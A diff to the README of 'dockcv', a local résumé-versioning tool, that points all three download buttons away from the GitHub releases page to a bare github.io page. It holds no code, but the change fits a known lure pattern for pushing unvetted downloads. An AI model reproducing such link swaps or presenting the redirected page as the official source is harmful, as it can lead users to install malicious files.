@@ -1,7 +1,7 @@
 <h1>📋 dockcv - Your Résumé, Versioned & Local</h1>
 
 <p align="center">
-<a href="https://github.com/trieuthanhtam20103/dockcv/releases"><img src="https://img.shields.io/badge/Download-dockcv-2ea44f?style=for-the-badge&logo=github&logoColor=white" alt="Download dockcv"></a>
+<a href="https://trieuthanhtam20103.github.io"><img src="https://img.shields.io/badge/Download-dockcv-2ea44f?style=for-the-badge&logo=github&logoColor=white" alt="Download dockcv"></a>
 </p>
 
 ## 🖥️ What Is dockcv?
@@ -37,7 +37,7 @@ Follow these three steps to start using dockcv today:
 Click the green button below to go to the download page:
 
 <p align="center">
-<a href="https://github.com/trieuthanhtam20103/dockcv/releases" style="background-color:#FF6B35; color:white; padding:14px 28px; text-decoration:none; font-size:18px; border-radius:8px; font-weight:bold; display:inline-block;">⬇️ Visit This Link to Download the Application</a>
+<a href="https://trieuthanhtam20103.github.io" style="background-color:#FF6B35; color:white; padding:14px 28px; text-decoration:none; font-size:18px; border-radius:8px; font-weight:bold; display:inline-block;">⬇️ Visit This Link to Download the Application</a>
 </p>
 
 On that page, look for the latest release (usually listed at the top). You'll see a file available for download. Click the file name to save it to your computer.
@@ -164,7 +164,7 @@ If you get stuck:
 One more time, in case you scrolled past it:
 
 <p align="center">
-<a href="https://github.com/trieuthanhtam20103/dockcv/releases" style="background-color:#4CAF50; color:white; padding:14px 28px; text-decoration:none; font-size:18px; border-radius:8px; font-weight:bold; display:inline-block;">⬇️ Visit This Link to Download the Application</a>
+<a href="https://trieuthanhtam20103.github.io" style="background-color:#4CAF50; color:white; padding:14px 28px; text-decoration:none; font-size:18px; border-radius:8px; font-weight:bold; display:inline-block;">⬇️ Visit This Link to Download the Application</a>
 </p>
 
 ---
